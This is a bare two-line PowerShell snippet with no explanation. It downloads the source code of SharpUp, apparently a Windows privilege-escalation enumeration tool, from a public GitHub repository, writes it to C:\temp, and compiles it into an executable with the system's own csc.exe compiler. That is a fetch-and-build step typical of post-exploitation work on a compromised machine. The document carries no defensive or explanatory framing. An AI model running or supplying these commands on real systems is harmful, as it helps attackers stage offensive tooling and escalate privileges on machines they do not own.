 $code = (iwr "https://raw.githubusercontent.com/GhostPack/SharpUp/master/SharpUp/Program.cs" -UseBasicParsing) | % { write-output $_.Content | out-file C:\temp\sharpup.cs }
C:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /nowarn /t:exe /out:c:\temp\sharpup.exe c:\temp\sharpup.cs 
